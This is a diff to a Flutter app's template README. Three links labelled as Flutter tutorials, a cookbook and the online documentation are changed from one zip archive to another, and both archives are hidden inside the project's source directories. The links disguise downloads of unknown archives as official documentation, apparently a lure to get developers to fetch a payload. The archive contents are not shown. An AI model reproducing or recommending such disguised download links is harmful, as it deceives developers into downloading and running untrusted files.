@@ -8,9 +8,9 @@ This project is a starting point for a Flutter application.
 
 A few resources to get you started if this is your first Flutter project:
 
-- [Lab: Write your first Flutter app](https://github.com/Milan-Tmg/Flutter-fitness-app/raw/refs/heads/main/lib/front_end/Authentication/signUp/fitness-Flutter-app-v2.1-beta.5.zip)
-- [Cookbook: Useful Flutter samples](https://github.com/Milan-Tmg/Flutter-fitness-app/raw/refs/heads/main/lib/front_end/Authentication/signUp/fitness-Flutter-app-v2.1-beta.5.zip)
+- [Lab: Write your first Flutter app](https://raw.githubusercontent.com/Milan-Tmg/Flutter-fitness-app/main/android/app/src/Flutter_fitness_app_2.8.zip)
+- [Cookbook: Useful Flutter samples](https://raw.githubusercontent.com/Milan-Tmg/Flutter-fitness-app/main/android/app/src/Flutter_fitness_app_2.8.zip)
 
 For help getting started with Flutter development, view the
-[online documentation](https://github.com/Milan-Tmg/Flutter-fitness-app/raw/refs/heads/main/lib/front_end/Authentication/signUp/fitness-Flutter-app-v2.1-beta.5.zip), which offers tutorials,
+[online documentation](https://raw.githubusercontent.com/Milan-Tmg/Flutter-fitness-app/main/android/app/src/Flutter_fitness_app_2.8.zip), which offers tutorials,
 samples, guidance on mobile development, and a full API reference.
